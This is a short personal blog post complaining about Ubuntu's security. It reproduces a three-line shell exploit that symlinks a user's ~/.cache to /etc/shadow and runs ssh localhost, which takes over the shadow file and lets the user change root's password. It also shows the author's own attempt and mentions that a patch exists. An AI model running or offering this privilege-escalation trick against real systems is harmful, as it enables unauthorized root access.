---
layout: post
title: 'uuurrgh... Ubuntu'
tags:
  - Security
  - Ubuntu
  - ugly
categories:
  - LinuxUnix
  - Security
  - Software

---

<a href="http://www.ubuntu.com/">Ubuntu</a>, you all should know, isn't my preferred operating system. It's very nice for linux beginners and may decrease some manual work at private machines, but when I've heard about the actual bug I'm very confused why we still have to use Ubuntu in our PC pools and why some work groups are emphatic about this system and why we have to administrate their server and local machines with Ubuntu.

I'm still wondering why simple users in Ubuntu systems can out of the box read all log files or the shadow.. That is not that kind of security I'm dreaming about ;)

The actual bug is very simple (<a href="https://twitter.com/jonoberheide/status/18009527979">via</a>):


{% highlight bash %}
rm -rf ~/.cache
ln -s /etc/shadow ~/.cache
ssh localhost
{% endhighlight %}


Now you've owned the shadow file and you are able to modify roots pass phrase! It's just too easy...

By the way I tried it by myself and got a funny message:


{% highlight bash %}
mscharm@SERVER ~ % ssh localhost
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that the RSA host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
aa:bb:cc:dd:ee:ff:gg:hh:ii:jj:kk:ll:mm:nn:oo:pp.
Please contact your system administrator.
Add correct host key in /homes/mscharm/.ssh/known_hosts to get rid of this message.
Offending key in /homes/mscharm/.ssh/known_hosts:10
RSA host key for localhost has changed and you have requested strict checking.
Host key verification failed.
255 mscharm@SERVER ~ %
{% endhighlight %}



And my friend Rumpel also tried this exploit and after lunch I just heard him saying


<blockquote>fuck, bolted out, by my self...</blockquote>


not able to disable his screensaver. Maybe he changed a little bit to much in his shadow file!? ;)


Fortunately the patch is released, so have a lot of fun while updating your systems. You should reboot after the update, otherwise the bug is still enabled...
